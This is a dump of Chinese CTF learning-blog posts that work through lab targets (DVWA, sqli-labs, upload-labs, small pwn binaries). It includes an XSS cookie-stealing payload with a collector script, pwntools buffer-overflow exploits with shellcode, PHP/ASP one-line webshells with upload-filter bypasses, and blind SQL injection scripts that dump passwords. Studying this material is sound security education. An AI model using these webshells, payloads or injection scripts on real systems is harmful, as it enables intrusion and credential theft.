Update database $query = \"INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );\"; $result = mysqli_query($GLOBALS[\"___mysqli_ston\"], $query ) or die( '&lt;pre&gt;' . ((is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_error($GLOBALS[\"___mysqli_ston\"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '&lt;/pre&gt;' ); //mysql_close();&#125;?&gt; 在 name 处和上一题的 high level 处是一样的漏洞。故虽然过滤了&lt;script&gt;，我们还是可以通过 HTML 的标签触发事件，引起弹窗。 Impossible源码： 123456789101112131415161718192021222324&lt;?phpif( isset( $_POST[ 'btnSign' ] ) ) &#123; // Check Anti-CSRF tokencheckToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); // Get input $message = trim( $_POST[ 'mtxMessage' ] ); $name = trim( $_POST[ 'txtName' ] ); // Sanitize message input $message = stripslashes( $message ); $message = ((isset($GLOBALS[\"___mysqli_ston\"]) &amp;&amp; is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_real_escape_string($GLOBALS[\"___mysqli_ston\"], $message ) : ((trigger_error(\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\", E_USER_ERROR)) ? \"\" : \"\")); $message = htmlspecialchars( $message ); // Sanitize name input $name = stripslashes( $name ); $name = ((isset($GLOBALS[\"___mysqli_ston\"]) &amp;&amp; is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_real_escape_string($GLOBALS[\"___mysqli_ston\"], $name ) : ((trigger_error(\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\", E_USER_ERROR)) ? \"\" : \"\")); $name = htmlspecialchars( $name ); // Update database $data = $db-&gt;prepare( 'INSERT INTO guestbook ( comment, name ) VALUES ( :message, :name );' ); $data-&gt;bindParam( ':message', $message, PDO::PARAM_STR ); $data-&gt;bindParam( ':name', $name, PDO::PARAM_STR ); $data-&gt;execute();&#125;// Generate Anti-CSRF tokengenerateSessionToken();?&gt; 将 name 和 message 处输入的数据都经过htmlspecialchars()函数的处理，完全被过滤。 XSS 盗取 cookie攻击原理：通过 XSS 漏洞，利用一些 js 函数来获取用户信息。 先在网站根目录下放入如下 php 文件： 1234&lt;?php $cookie = $_GET['cookie']; file_put_contents('cookie.txt', $cookie)?&gt; PHP 文件中的&#39;很容易和中文的单引号‘搞混。 以下为 XSS 的 payload： 123&lt;script&gt; document.location=\"http://127.0.0.1/dvwa/cookie.php?cookie=\"+document.cookie;&lt;/script&gt; 输入 payload 后，在网站根目录下cookie.txt中存入了 cookie 的值。 BeEFThe Browser Exploitation Framework，一个著名的 XSS 利用框架，是一个交互界面友好、高度集成、开源的一个项目。BeEF 可以和 MSF 结合起来一起使用。 PS：MSF 是一个免费的、可下载的框架，通过它可以很容易地获取、开发并对计算机软件漏洞实施攻击。它本身附带数百个已知软件漏洞的专业级漏洞攻击工具。 如何用 BeEF 进行客户端劫持： 在 Kali 下打开 BeEF 得到管理界面的 URL 和攻击 URL 利用 XSS 漏洞来访问攻击的 URL 参考网站http://www.freebuf.com/articles/web/123779.htmlhttps://www.cnblogs.com/andy-zhou/p/5360107.html","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"blog.b3ale.cn/tags/ctf/"},{"name":"web","slug":"web","permalink":"blog.b3ale.cn/tags/web/"}]},{"title":"PWN入门（二）","slug":"PWN入门（二）","date":"2018-07-07T05:23:05.000Z","updated":"2019-08-26T05:53:21.579Z","comments":true,"path":"2018/07/07/PWN入门（二）/","link":"","permalink":"blog.b3ale.cn/2018/07/07/PWN入门（二）/","excerpt":"初涉 PWN。","text":"初涉 PWN。 关于 PWN 底层的原理栈帧平衡一些基本内容： ESP：栈指针寄存器，存放一个指针，该指针永远指向系统栈最上面的栈帧的栈顶 EBP：基址指针寄存器，该指针永远指向系统栈最上面的栈帧的底部 函数栈帧：ESP 和 EBP 之间内存空间为当前栈帧 在函数栈帧中一般包含以下几种信息： 局部变量：为函数举报变量开辟的内存空间 栈帧状态值：保存前栈帧的顶部和底部（实际上只保存前栈帧的底部，前栈帧的顶部可以通过堆栈平衡得到） 函数返回地址：保存当前函数调用前的“断点”信息，也就是函数调用前的指令位置 如何保证栈帧平衡： 1234567PUSH EBP // 将栈底指针存入栈，即保存当前栈帧状态值MOV EBP,ESP // 将栈顶的值赋给栈底，即讲当前栈帧切换到新栈帧XXXXXX // 函数中间部分MOV ESP,EBP // 将栈底的值赋给栈顶，即降低栈顶，回首当前栈帧空间POP EBP // 弹出栈底指针，即将当前栈帧底部保存的前栈帧值弹出，恢复出上一个栈帧 函数返回的步骤： 保存返回值，通常将函数的返回值保存在寄存器 EAX 中。 弹出当前帧，恢复上一个栈帧。具体包括： 在堆栈平衡的基础上，给 ESP 加上栈帧的大小，降低栈顶，回收当前栈帧的空间。 将当前栈帧底部保存的前栈帧 EBP 值弹入 EBP 寄存器，恢复出上一个栈帧。 将函数返回地址弹给 EIP 寄存器。 跳转：按照函数返回地址跳回母函数中继续执行。 PS：栈的守护天使——GS，也称作 Stack Canary/Cookie 调用函数（Call）CALL 可以化为两部分，即Push retaddr + Jump。先讲函数返回的地址入栈，再跳转到函数执行的位置处。 返回值（Ret）RET 也可以转化为两部分，即Pop retaddr + Jump。先是把返回值的地址出栈，再跳转回原本调用函数处。 缓冲区溢出（Buffer Overflow）缓冲区溢出是针对程序设计缺陷，向程序输入缓冲区写入使之溢出的内容，从而破坏程序运行、趁著中断之际并获取程序乃至系统的控制权。 缓冲区溢出原指当某个数据超过了处理程序限制的范围时，程序出现的异常操作。 尤其是 C 语言，不像其他一些高级语言会自动进行数组或者指针的边界检查，增加溢出风险。C 语言中的 C 标准库还具有一些非常危险的操作函数，使用不当也为溢出创造条件。 Linux 下的 Pwn 常用命令 命令 功能 cd 进入文件夹 ls 列出当前目录下的所有文件 mkdir 创建文件夹 pwd 显示当前所在目录 chmod 改变文件使用权限 objdump 查看目标文件或者可执行的目标文件的构成 gdb 使用 gdb 进行调试 checksec 检测二进制的保护机制是否开启（peda 中的命令） Linux 下的 Pwn 常用到的工具 gdb：Linux 调试中必要用到的 gdb-peda：gdb 方便调试的工具，类似的工具有 gef，gdbinit，这些工具的安装可以参考：http://blog.csdn.net/gatieme/article/details/63254211 pwntools：写 exp 和 poc 的利器 checksec：可以很方便的知道 elf 程序的安全性和程序的运行平台 objdump 和 readelf：可以很快的知道 elf 程序中的关键信息 ida pro：强大的反编译工具 ROPgadget：强大的 rop 利用工具 one_gadget：可以快速的寻找 libc 中的调用 exec(‘bin/sh’)的位置 libc-database：可以通过泄露的 libc 的某个函数地址查出远程系统是用的哪个 libc 版本 gdb 基本命令 命令 功能 start 开始调试 pattc 生成规律字符串 patto 查找字符串 q 退出 n 执行一行源代码但不进入函数内部 ni 执行一行汇编代码但不进入函数内部 s 执行一行源代码而且进入函数内部 si 执行一行汇编代码而且进入函数内部 c 继续执行到下一个断点 b 下断点 stack 显示栈信息 x 按十六进制格式显示内存数据 r 运行代码 Pwntools 基本函数 函数 功能 process() sendline() 向目标发送一行字符串 interactive() 实现和程序之间的交互 remote() 远程连接 context() 设置运行时变量 p32()/p64() 把整数转化为 32/64 位的字符串 u32()/u64() 把 32/64 位字符串转化成整数 asm()/disasm() 快速汇编/反汇编 log() 输出消息 Pwn 的小练习第一次做 pwn 题，虽然是在有源码的情况下。但是还是被 pwn 的神奇所震撼。 p1程序源码： 12345678910111213141516#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;void vmd()&#123; system(\"sh\");&#125;void A()&#123; char a[100]; scanf(\"%s\",a); return;&#125;int main()&#123; A();&#125; 输入gcc p1.c -o p1 -m32，用来编译 32 位的程序。 直接覆盖返回地址根据源文件可以判断该程序调用A()函数时，在 scanf 中没有对字符串的长度做限制，即存在缓冲区溢出。 根据源码，本题的思路应该为通过缓冲区溢出，将 RET 处的地址修改为cmd()函数的地址，直接跳转到该函数后 getshell。故先通过objdump命令寻找到 cmd 函数的地址 然后输入gdb p1进入 gdb 调试界面。start开始调试程序。 已知偏移量为 112 后，容易知道可以直接通过溢出在 RET 处覆盖原本的地址，直接跳至cmd()函数处。 payload 如下： 12345from pwn import *payload = \"A\" * 112 + \"\\x6b\\x84\\x04\\x08\"p = process(\"./p1\")p.sendline(payload)p.interactive() Ret_slide在不知道返回地址偏移时，通过滑翔机（Ret_slide）设置 payload 减少尝试次数。即 RET 前的字符串利用其他 RET 地址来填充。 因为 RET 相当于 POP 和 JMP 两个步骤，每次 RET 都会重新返回到上一个地址，最后执行到目标地址时就会直接跳转。 payload： 12345from pwn import *payload = \"\\x08\\x04\\x84\\xa0\" * 28 + \"\\x6b\\x84\\x04\\x08\"p = process(\"./p1\")p.sendline(payload)p.interactive() 3-13程序源码： 123456789101112131415161718#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;void A()&#123; setvbuf(stdout, 0, _IONBF, 0); srand(time(0) ^ getpid()); char buf[100]; int magic = rand(); gets(buf); if (atoi(buf) == magic) &#123; puts(\"Okay...\"); system(\"sh\"); &#125;&#125;int main()&#123; A();&#125; 同样输入gcc 3-13.c -o 3-13 -m32来编译。 调试一开始发现权限不够，通过chmod +x 3-13来获得可执行权限。 源代码中使用了gets()函数，存在缓存区溢出，故第一个想法应该就是通过对变量buf操作使其覆盖变量magic的值，使两者相同后得到 shell。 buf被定义为一个占 100 字节的字符串，而magic被定义为一个占 4 字节的整型。 根据调试过程可以知道，buf的地址为 0xffffcf68，而magic的地址为 0xffffcfcc。buf的地址比magic的地址更低，两者在栈中显然是先压入magic再压入buf。又因为输入数据是从低位向高位输入，那么我们可以通过变化buf的值来覆盖magic的值。最简单的方法显然是让两者都等于零。 根据以上的推测，那么输入字符串的长度应当至少为 100+4=104 字节才可能完全覆盖变量magic。 故 payload 为： 12345from pwn import *p = process('./3-13')payload = '\\0' * 104p.sendline(payload)p.interactive() 这里的\\0也就是\\x00，而如果输入的是字符0，转为十六进制后为\\x30，将不能满足条件，无法 getshell。 这题附上梅大佬的 payload，这里可以放 shellcode： 123456789101112from pwn import *offset=116r=process(\"3-13\")elf=ELF(\"3-13\")bss=elf.bss()get=elf.symbols['gets']shell=\"\\xeb\\x1b\\x5f\\x31\\xc0\\x6a\\x53\\x6a\\x18\\x59\\x49\\x5b\\x8a\\x04\\x0f\\xf6\\xd3\\x30\\xd8\\x88\\x04\\x0f\\x50\\x85\\xc9\\x75\\xef\\xeb\\x05\\xe8\\xe0\\xff\\xff\\xff\\x1c\\x7f\\xc5\\xf9\\xbe\\xa3\\xe4\\xff\\xb8\\xff\\xb2\\xf4\\x1f\\x95\\x4e\\xfe\\x25\\x97\\x93\\x30\\xb6\\x39\\xb2\\x2c\"payload=\"A\"*offset+p32(get)+p32(bss)+p32(bss)r.sendline(payload)r.sendline(shell)r.sendline('/bin/sh')r.interactive() 参考网站https://zh.wikipedia.org/wiki/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BAhttps://paper.seebug.org/481/https://bbs.pediy.com/thread-212691.htmhttp://blog.xiyoulinux.org/detail.jsp?id=1965http://www.cnitblog.com/houcy/archive/2013/03/16/87075.htmlhttps://blog.csdn.net/qq_29343201/article/details/51337025http://www.91ri.org/14382.html","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"blog.b3ale.cn/tags/ctf/"},{"name":"pwn","slug":"pwn","permalink":"blog.b3ale.cn/tags/pwn/"}]},{"title":"WEB入门（三）","slug":"WEB入门（三）","date":"2018-07-06T01:04:22.000Z","updated":"2019-08-26T05:49:07.865Z","comments":true,"path":"2018/07/06/WEB入门（三）/","link":"","permalink":"blog.b3ale.cn/2018/07/06/WEB入门（三）/","excerpt":"今天学姐主要讲了文件上传漏洞，了解了 Cknife 等工具的使用。","text":"今天学姐主要讲了文件上传漏洞，了解了 Cknife 等工具的使用。 文件上传漏洞上传的文件不进行限制，有可能会被利用于上传可执行文件、脚本到服务器上，并且通过脚本文件可以获得执行服务器端命令的能力 木马根据语言分类，有 PHP、ASP、JSP、ASP.NET 等不同语言下的木马；根据作用分类，有大马和小马。 PHP 一句话木马： &lt;?php ehco shell_exec($_GET[&#39;a&#39;]); ?&gt; &lt;?php ehco shell_exec($_POST[&#39;a&#39;]); ?&gt; &lt;?php @eval($_POST[&#39;a&#39;]); ?&gt; ASP 一句话木马： &lt;%eval request(&quot;Cknife&quot;)%&gt; ASP.NET 一句话木马： &lt;%@ Page Language=&quot;Jscript&quot;%&gt;&lt;%eval(Request.Item[&quot;Cknife&quot;],&quot;unsafe&quot;);%&gt; 利用函数 shell_exec(): 通过环境执行命令，并且将完整的输出以字符串的方式返回。 eval(): 把字符串作为 PHP 代码执行执行 a 接收到的内容。 phpinfo() 介绍 内容 语法 int phpinfo(void); 返回值 整数 函数种类 PHP 系统功能 phpinfo()会泄漏很多敏感的信息。 绝对路径（_SERVER[“script_FILENAME”]） 找到 phpinfo()可以直接找到网站的绝对路径。 支持的程序 可以查看一些特殊的程序服务，诸如 redis、memcache、mysql、SMTP、curl。要是服务器装了 redis 或者 memcache，就可以通过 ssrf 来 getshell。 泄漏真实 ip（_SERVER[“SERVER_ADDR”]或者 SERVER_ADDR） 得到的 ip 可以直接用来查旁站和 c 段。 GOPHER 如果支持 gopher 也能直接用 ssrf。 fastcgi 查看是否开启 fastcgi 和查看 fastcgi 的版本，可能导致解析漏洞、远程命令执行、任意文件读取等问题。 泄漏缓存文件地址（_FILES[“file1”]） 向 phpinfo()post 一个 shell 后，可以在”_FILE[“file1”]”中看到上传的临时文件，如果有个 LFI，便可以直接 getshell。 一些敏感配置 allow_url_include：远程文件包含 disable_functions：查看金庸函数 open_basedir：读取一些没权限的目录 还能获取一些环境信息，如 environment 中的 path、log 等。 Linux 基本命令 ls：列出当前目录下所有文件 pwd：查看文件当前目录 Cknife（菜刀）超级强大的网站管理工，分为客户端和代码两部分 只要将那简短的一句话代码放到网站上去就可以取得网站的权限 运行环境：安装了 JRE1.7+环境的所有操作系统 主要功能：文件管理、虚拟终端、数据库管理 DVWA 之 File Uploadlow level 的测试一下，源码中没有对任何文件格式进行过滤： 写出一句话木马 用菜刀连接的一句话木马： 1&lt;?php @eval($_POST['a']; ?&gt; 直接在网页下通过 GET 的一句话木马： 1&lt;?php echo shell_exec($_GET['a']); ?&gt; 在网页下用 hackbar 通过 POST 的一句话木马： 1&lt;?php echo shell_exec($_POST['a']); ?&gt; 上传一句话木马直接在网页查到文件 Cknife 连接 源码： 123456789101112131415161718 &lt;?php if (isset($_POST['Upload'])) &#123; $target_path = DVWA_WEB_PAGE_TO_ROOT.\"hackable/uploads/\"; //上传路径为../../hackable/uploads/ $target_path = $target_path . basename( $_FILES['uploaded']['name']); //上传路径加上上传的文件名 if(!move_uploaded_file($_FILES['uploaded']['tmp_name'], $target_path)) &#123; //对是否上传成功做出判断，因此所有格式的文件都能上传 echo '&lt;pre&gt;'; echo 'Your image was not uploaded.'; echo '&lt;/pre&gt;'; &#125; else &#123; echo '&lt;pre&gt;'; echo $target_path . ' succesfully uploaded!'; echo '&lt;/pre&gt;'; &#125; &#125;?&gt; 文件上传漏洞检测 客户端 javascript 检测：通常在本地检测文件的扩展名 服务端 MIME 类型检测：通常检测的是 Content-Type 内容 服务端目录路径检测：通常根 path 参数相关的内容 服务端文件扩展名检测：通常检测跟文件 extension 相关的内容 服务端文件内容检测：检测文件内容是否合法或含有恶意代码 客户端 javascript 检测在客户端使用 js 对不合法图片进行检查 绕过： 禁用页面 js 先把文件改成符合条件的文件格式上传，在抓包，修改文件的后缀名 服务端检测绕过（MIME 类型检测）通过判断$_FILES[&#39;userfile&#39;][&#39;type&#39;]!=&quot;imgae/gif&quot;来保证上传的文件类型为 gif 绕过：通过 burp 抓包，将原来的 Content-Type 类型改为符合要求的类型 1Content-Type: application/octet-stream application/octet-stream即为 php 文件的文件类型格式 服务端目录路径检测上传路径为/image/20160704时，可以通过修改为image/20160704/eval.php%00filename.gif 通过%00 截断最终导致存储的文件名为eval.php 服务端文件扩展名检测分为黑名单检测和白名单检测 黑名单检测接收上传的文件做对比，如果匹配到黑名单中的后缀名，则不允许上传 绕过： 后缀名大小写绕过，例如：将 Burpsuite 截获的数据包中的文件名evil.php改evil.php 名单列表绕过，尝试使用非黑名单内的后缀名，如 php5，php7 等 特殊文件名绕过（只适用 windows，将文件名改为evil.php.或evil.php（注意这里有一个空格)。在 windows 下，不允许这样的命名，所以会将.和空格自动去掉）。 0x00 截断绕过：在上传的时候，当文件系统读到 0x00 时，会认为文件已经结束。例如：1.php%00.jpg，验证扩展名是.jpg，但写入的时候是1.php文件 白名单检测接收上传的文件做扩展名匹配，匹配上的白名单中的扩展名的文件才能上传 绕过： 0x00 阶段绕过 解析漏洞绕过 （1）apache 解析文件名是从右到左识别扩展名，如eval.php.jpg，文件为 php 文件，不能解析 jpg 会向前解析 php （2）IIS6.0 目录名包含.asp、.asa、.cer的话，则该目录下的所有文件都将按照 asp 解析。 （3）IIS6.0 不解析;后面的，所以提交evil.asp;.html解析为 asp 类型 （4）Nginx 解析漏洞：将 php 文件换成其他可以通过的文件后缀，访问的时候在后面加上eval.php.jpg，如evil.jpg/.php，evil.jpg会解析为 php 的格式 服务端文件内容检测 图像类文件内容检测 文件幻数检测（图片头格式检测） jpg 内容头 value = FF D8 FF E0 00 10 4A 46 49 46 gif 内容头 value = 47 49 46 38 39 61 png 内容头 value = 89 50 4E 47 绕过：在文件头后加上一句话木马就能绕过 Upload-Labs分别对客户端 javascript 检测、服务端 MIME 类型检测、服务端目录路径检测三种不同类型的绕过进行练习。 这里有个坑。经过潘大佬的测试，上传文件超过了文件大小 php.ini 中即系统设定的大小。php.ini 中的配置原本为upload_max_filesize = 2M，修改为upload_max_filesize = 20M。然后就可以上传文件了。 pass-01源码： 123456789101112131415161718192021function checkFile() &#123; var file = document.getElementsByName(\"upload_file\")[0].value; if (file == null || file == \"\") &#123; alert(\"请选择要上传的文件!\"); return false; &#125; //定义允许上传的文件类型 var allow_ext = \".jpg|.png|.gif\"; //提取上传文件的类型 var ext_name = file.substring(file.lastIndexOf(\".\")); //判断上传文件类型是否允许上传 if (allow_ext.indexOf(ext_name + \"|\") == -1) &#123; var errMsg = \"该文件不允许上传，请上传\" + allow_ext + \"类型的文件,当前文件类型为：\" + ext_name; alert(errMsg); return false; &#125;&#125; 可以知道此处的过滤是通过 javascript 实现的，在开发者工具中禁用 js 就可以上传木马 pass-02源码： 12345678910111213141516$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists($UPLOAD_ADDR)) &#123; if (($_FILES['upload_file']['type'] == 'image/jpeg') || ($_FILES['upload_file']['type'] == 'image/png') || ($_FILES['upload_file']['type'] == 'image/gif')) &#123; if (move_uploaded_file($_FILES['upload_file']['tmp_name'], $UPLOAD_ADDR . '/' . $_FILES['upload_file']['name'])) &#123; $img_path = $UPLOAD_ADDR . $_FILES['upload_file']['name']; $is_upload = true; &#125; &#125; else &#123; $msg = '文件类型不正确，请重新上传！'; &#125; &#125; else &#123; $msg = $UPLOAD_ADDR.'文件夹不存在,请手工创建！'; &#125;&#125; 这里对文件 MIME 类型进行了限制，只需要用 burpsuite 抓包后，将Content-Type修改为image/jpeg或image/gif或image/png，放包后上传成功 pass-11源码： 1234567891011121314151617181920$is_upload = false;$msg = null;if(isset($_POST['submit']))&#123; $ext_arr = array('jpg','png','gif'); $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],\".\")+1); if(in_array($file_ext,$ext_arr))&#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = $_GET['save_path'].\"/\".rand(10, 99).date(\"YmdHis\").\".\".$file_ext; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else&#123; $msg = '上传失败！'; &#125; &#125; else&#123; $msg = \"只允许上传.jpg|.png|.gif类型文件！\"; &#125;&#125; 这里由于有 jpg、png、gif 的白名单，需要想办法绕过。然后在接收到文件后还会对文件修改名字并最后存为相应格式的文件。故这里先将上传的文件修改为白名单中的格式，再把文件最后存储的位置通过%00 对后面的后缀名截断 实验吧之上传绕过bypass the upload格式：flag{}解题链接 0x00 截断上传12345&lt;%path=\"upfiles/picture/\"file=\"20180321.jpg\"upfilename=path &amp; file '最后的上传地址%&gt; upfilename即为最终名字，意思为如果地址为picture/1.php+，文件名为1.jpg则最终上传上去的文件路径为picture/1.php+1.jpg。0x00 截断的思路即为将+之后的内容忽略掉使上传文件1.jpg最终上传到1.php中。 先随便上传一个图片文件，提示需要上传 php 文件。同样上传 php 文件，提示需要上传其他格式文件。 这里就需要用到 0x00 截断。提交图片后使用 burpsuite 抓包，在/uploads/后面加上1.php+。 然后在 hex 里把+对应的十六进制改为00。 修改完成后得到 flag。 参考网站http://www.php.cn/php-weizijiaocheng-359309.htmlhttps://blog.csdn.net/zhanghw0917/article/details/46793847https://www.cnblogs.com/bmjoker/p/9141322.html","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"blog.b3ale.cn/tags/ctf/"},{"name":"web","slug":"web","permalink":"blog.b3ale.cn/tags/web/"}]},{"title":"WEB入门（二）","slug":"WEB入门（二）","date":"2018-07-04T05:50:22.000Z","updated":"2019-08-26T05:49:16.282Z","comments":true,"path":"2018/07/04/WEB入门（二）/","link":"","permalink":"blog.b3ale.cn/2018/07/04/WEB入门（二）/","excerpt":"今天学姐复习了前天的数字型和字符型注入，讲了 SQL 注入中可能出现的过滤以及绕过的方式，以及布尔型盲注和时间型盲注。","text":"今天学姐复习了前天的数字型和字符型注入，讲了 SQL 注入中可能出现的过滤以及绕过的方式，以及布尔型盲注和时间型盲注。 带过滤的 SQL 注入SQL 注入的过程中有些特定的字符或者字符串会被过滤，数据库无法了解正确的查询语句。 如何绕过过滤运用编码技术绕过 ASCII 码 CHAR(101, 97, 115, 116)即等价于east URL 编码 0x61646D696E即等价于admin 重复例如： 12seleselectctadmadminin 大小写交替例如： 12SeLEctUnIOn 空格的绕过 用两个空格或者 TAB 代替 %a0 代替 /**/代替 用括号()代替 用+代替 用花括号{}代替 用单引号或双引号代替 关键表名过滤绕过information_schema(这里空格).(这里空格)tables 过滤等号用 like 可以替代 过滤引号0x7573657273即等于&quot;users&quot; 过滤大于小于号函数 greatest()和 least()分别替代(&gt;)和(&lt;) 例如： 1select * from users where id=1 and ascii(substr(database(),1,1))&gt;64 等价于 1select * from users where id=1 and greatest(ascii(substr(database(),1,1)),64)=64 过滤逗号substr(str,1,1)等价于substr(str from 1 for 1) SLEEP 函数中不能用数字用 pi()和 ceil()过滤 1sleep(ceil(pi())) 过滤注释符（#、–+）用闭合的方式： 11&apos; and &apos;1 宽字节注入在 MYSQL 中是用 GBK 编码时，会认为两个字符为一个汉字。宽字节注入即通过增加一个字符来过滤掉转义字符前的反斜杠 比如“\\’”的 urlencode 编码为%5c%27，在前面加上%df，会使得%df%5c 构成一个汉字，%27 则作为一个单独的单引号 order by 被过滤使用 into 变量来绕过： 1select * from users limit 1,1 into @a,@b,@c 在本地一张有六个字段的表中测试： 利用等价函数 hex()、bin() ==&gt; ascii() sleep() ==&gt; benchmark() concat_ws() ==&gt; group_concat() mid()、substr()==&gt; substring() @@user ==&gt; user() @@datadir ==&gt; datadir() MYSQL 条件注释利用1/*!..*/ 以上语句在其他数据库中不执行，但在 MYSQL 中执行 1/*!50000...*/ 以上语句在 50000 版本以上不执行，否则必执行，用于过滤正则表达式 盲注铁盆对 SQL 回显注入的解释： 1我问你叫什么名字，你回答你叫奥特曼。 而 SQL 盲注是相反的，即不直接显示搜索到的结果，而从其他方式来推断得出结果的 SQL 注入 SQL 盲注常用函数： if 和 case when：用于时间盲注 substring、substr、mid 等：用于截断字符串 ascii：使字符变成 ASCII 码 limit offset：用于猜取内容 布尔盲注即只有 TRUE 和 FALSE 两种状态，过程中需要猜测，直到正确为止 铁盆箴言： 123我问你叫什么名字，你只会说是和不是(ture false)。于是就，我问你叫不叫李狗蛋呀，不是。叫不叫王大花呀，不是。一直猜到是为止。但是猜也讲究技巧，一个字一个字的猜的效率比一起猜三个字效率不知道高几倍。 判断是否有盲注点 121&apos; and 1=1 # 返回TRUE1&apos; and 1=2 # 返回FALSE，并且没有返回 即 SQL 语句执行成功和失败的返回界面存在某种固定的差异 猜解库名、表名、列名、内容 12341&apos; and substr(database(),1,1)=&apos;a&apos; # 猜解库名1&apos; and substr((select group_concat(table_name) from information_schema.tables where table_schema=&apos;DatabaseName&apos;),1,1)=&apos;a&apos; # 猜解表名1&apos; and substr((select group_concat(column_name) from information_schema.columns where table_name=&apos;TableName&apos;),1,1)=&apos;a&apos; # 猜解列名1&apos; and substr((select group_concat(SomeThing) from DatabaseName.TableName),1,1)=&apos;a&apos; # 猜解表名 以上即为基本的猜解过程 时间盲注即对一个命令只有一个固定的反应，如果是正确的就会等待一定的时间再反应，如果错误立即反应 铁盆箴言： 12我问你叫什么名字，无论对错，你只会 啊 的叫一声。于是就，是 = 让你立马啊，不是 = 让你过一会再啊，以此区分，就便成布尔型一样了。 判断是否有盲注点 121&apos; and if(1=1,sleep(5),1) # 延迟返回为TRUE1&apos; and if(1=2,sleep(5),1) # 不延迟返回为FALSE 基本与布尔盲注类似。 猜解库名、表名、列名、内容 12341&apos; and if((substr(database(),1,1)=&apos;a&apos;),sleep(5),1) # 猜解库名1&apos; and if((substr((select group_concat(table_name) from information_schema.tables where table_schema=&apos;DatabaseName&apos;),1,1)=&apos;a&apos;),sleep(5),1) # 猜解表名1&apos; and if((substr((select group_concat(column_name) from information_schema.columns where table_name=&apos;TableName&apos;),1,1)=&apos;a&apos;),sleep(5),1) # 猜解列名1&apos; and if((substr((select group_concat(SomeThing) from DatabaseName.TableName),1,1)=&apos;a&apos;),sleep(5),1) # 猜解表名 以上即为基本的猜解过程。 DVWA 之 SQL Injection上课没有认真听，DVWA 安全级别一直开在 high，试了好久都做不出。下面就记录一下解题过程。 判断注入类型 判断字段数 猜解库名、表名、列名 获取密码 题目源码12345678910111213141516171819202122232425262728&lt;?phpif(isset($_GET['Submit']))&#123; // Retrieve data $id = $_GET['id']; $getid = \"SELECT first_name, last_name FROM users WHERE user_id = '$id'\"; $result = mysql_query($getid) or die('&lt;pre&gt;' . mysql_error() . '&lt;/pre&gt;' ); $num = mysql_numrows($result); $i = 0; while ($i &lt; $num) &#123; $first = mysql_result($result,$i,\"first_name\"); $last = mysql_result($result,$i,\"last_name\"); echo '&lt;pre&gt;'; echo 'ID: ' . $id . '&lt;br&gt;First name: ' . $first . '&lt;br&gt;Surname: ' . $last; echo '&lt;/pre&gt;'; $i++; &#125;&#125;?&gt; SQL-LABS-MASTER这里有个很大的坑。因为自己是在虚拟机上跑的 PHPSTUDY，想用脚本跑盲注的时候觉得有点麻烦，就直接用女朋友的电脑了。但是在女朋友的电脑上发现开不了 APACHE，只能用 NGINX，然后就发现各种脚本跑不出，手注也不行，但是在别人的电脑上明明能跑啊。 还好有牛逼的啦啦大哥哥帮忙才发现了漏洞。 在 PHP 的配置文件 php-ini 中发现参数 agc_quotes_gpc 是 on 的，即会对注入时的单引号进行转义，原本的注入点就很难被注入。修改成 off 之后即可 less-5根据测试可以判断这里为布尔盲注 脚本如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263import requestsurl = \"http://127.0.0.1/sqli-labs-master/less-5/index.php?id=\"payload = \"abcdefghijklmnopqrstuvwxyz1234567890!@#&#123;&#125;_-=+[]&amp;();\"def get_databse(): res = \"\" for i in range(1, 100): print(i) for ch in payload: sql = \"1' and substr(database(),&#123;&#125;,1)='&#123;&#125;'%23\".format(i, ch) r = requests.get(url + sql) if(len(r.text) == 704): res += ch print(res) break print(\"Database: \", res)def get_tables(): res = \"\" for i in range(1, 100): print(i) for ch in payload: sql = \"1' and substr((select group_concat(table_name separator ';') from information_schema.tables where table_schema='security'),&#123;&#125;,1)='&#123;&#125;'%23\".format(i, ch) r = requests.get(url + sql) if(len(r.text) == 704): res += ch print(res) break print(\"Table names: \", res)def get_columns(): res = \"\" for i in range(1, 100): print(i) for ch in payload: sql = \"1' and substr((select group_concat(column_name separator ';') from information_schema.columns where table_name='users' and table_schema=database()),&#123;&#125;,1)='&#123;&#125;'%23\".format(i, ch) r = requests.get(url + sql) if(len(r.text) == 704): res += ch print(res) break print(\"Column names: \", res)def get_flag(): res = \"\" for i in range(1, 100): print(i) for ch in payload: sql = \"1' and substr((select group_concat(password separator ';') from security.users),&#123;&#125;,1)='&#123;&#125;'%23\".format(i, ch) r = requests.get(url + sql) if(len(r.text) == 704): res += ch print(res) break print(\"Flag: \", res)if __name__ == '__main__': # get_databse() # 库名：security # get_tables() # 表名：emails;referers;uagents;users # get_columns() # 列名：1.id;email_id 2.id;referer;ip_address 3.id;uagent;ip_address;username 4.id;username;password # 根据以上的结果可以认为需要找的东西在users表中的password字段 get_flag() # dumb;i-kill-you;p@ssword;crappy;stupidity;genious;mob!le;admin;admin1;admin2;admin3;dumbo;admin4 最后看一看网页源码，其实实现还是很简单的 less-9根据测试判断为时间盲注 脚本如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768import requestsurl = \"http://127.0.0.1/sqli-labs-master/less-9/index.php?id=\"payload = \"abcdefghijklmnopqrstuvwxyz1234567890!@#&#123;&#125;_-=+[]&amp;();\"def get_databse(): res = \"\" for i in range(1, 100): print(i) for ch in payload: sql = \"1' and if((substr(database(),&#123;&#125;,1)='&#123;&#125;'),sleep(4),1)%23\".format(i, ch) try: r = requests.get(url + sql, timeout=3.9) except requests.exceptions.ReadTimeout: res += ch print(res) break print(\"Database: 